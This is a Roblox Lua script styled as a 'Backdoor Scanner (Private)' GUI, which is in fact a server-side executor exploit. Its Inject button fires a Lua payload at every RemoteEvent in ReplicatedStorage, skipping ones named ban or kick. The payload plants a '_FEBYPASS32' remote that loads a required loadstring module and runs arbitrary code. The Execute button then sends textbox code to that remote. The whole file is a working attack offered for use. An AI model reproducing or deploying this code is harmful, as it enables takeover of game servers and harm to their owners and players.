local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local G2L = {}

-- BACKGROUND GUI from Backdoor Scanner with your colors and layout --

G2L["ScreenGui"] = Instance.new("ScreenGui", playerGui)
G2L["ScreenGui"].Name = "BackdoorScannerUI"
CollectionService:AddTag(G2L["ScreenGui"], "main")

local Frame = Instance.new("Frame", G2L["ScreenGui"])
Frame.Size = UDim2.new(0.3, 0, 0.15, 0)
Frame.Position = UDim2.new(0.35, 0, 0.4, 0)
Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

local title = Instance.new("TextLabel", Frame)
title.Size = UDim2.new(1, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Text = "Backdoor Scanner (Private)"
title.Font = Enum.Font.SourceSansBold

local outputBox = Instance.new("TextBox", Frame)
outputBox.ClearTextOnFocus = false
outputBox.MultiLine = true
outputBox.Size = UDim2.new(1, -10, 0.6, -10)
outputBox.Position = UDim2.new(0, 5, 0.3, 5)
outputBox.TextWrapped = true
outputBox.TextColor3 = Color3.new(1, 1, 1)
outputBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
outputBox.Text = ""
outputBox.Font = Enum.Font.Code

-- Here start the SM1LE SS execution logic exactly --

local exec = Instance.new("TextButton", Frame)
exec.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
exec.Position = UDim2.new(0, 0, 0, 172)
exec.Size = UDim2.new(0, 161, 0, 46)
exec.Font = Enum.Font.Arial
exec.Text = "Inject"
exec.TextColor3 = Color3.fromRGB(0, 0, 0)
exec.TextSize = 32
exec.TextWrapped = true

local unfe = Instance.new("TextButton", Frame)
unfe.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
unfe.Position = UDim2.new(0, 161, 0, 172)
unfe.Size = UDim2.new(0, 175, 0, 46)
unfe.Font = Enum.Font.Arial
unfe.Text = "Execute"
unfe.TextColor3 = Color3.fromRGB(0, 0, 0)
unfe.TextSize = 32
unfe.TextWrapped = true

local clear = Instance.new("TextButton", Frame)
clear.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
clear.Position = UDim2.new(0, 337, 0, 172)
clear.Size = UDim2.new(0, 118, 0, 46)
clear.Font = Enum.Font.Arial
clear.Text = "Clear"
clear.TextColor3 = Color3.fromRGB(0, 0, 0)
clear.TextSize = 32
clear.TextWrapped = true

-- Inject button logic to create _FEBYPASS32 remote --
exec.MouseButton1Click:Connect(function()
	local function b_G_V12(see)
		local a = function(ree)
			ree:FireServer([[
				local folder = Instance.new('RemoteEvent')
				folder.Name = "_FEBYPASS32"
				folder.Parent = game:GetService("JointsService")
				local loadstring = require(13684410229)
				folder.OnServerEvent:Connect(function(_1,_2)
				   loadstring(_2)()
				end)
			]])
		end
		for i, v in pairs(see:GetChildren()) do
			if v:IsA("RemoteEvent") then
				if not string.match(string.lower(v.Name), "ban") then
					if not string.match(string.lower(v.Name), "kick") then
						a(v)
					end
				end
			end
			b_G_V12(v)
		end
	end
	b_G_V12(game:GetService("ReplicatedStorage"))
	local timetoken = 0
	local maxtime = 5
	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		exec.Text = "Injected"
	end
end)

-- Execute button sends TextBox text to _FEBYPASS32 remote --
unfe.MouseButton1Click:Connect(function()
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(outputBox.Text)
	else
		warn("Failed to loadstring: Error 404")
	end
end)

-- Clear button clears TextBox --
clear.MouseButton1Click:Connect(function()
	outputBox.Text = ""
end)

return G2L["ScreenGui"]
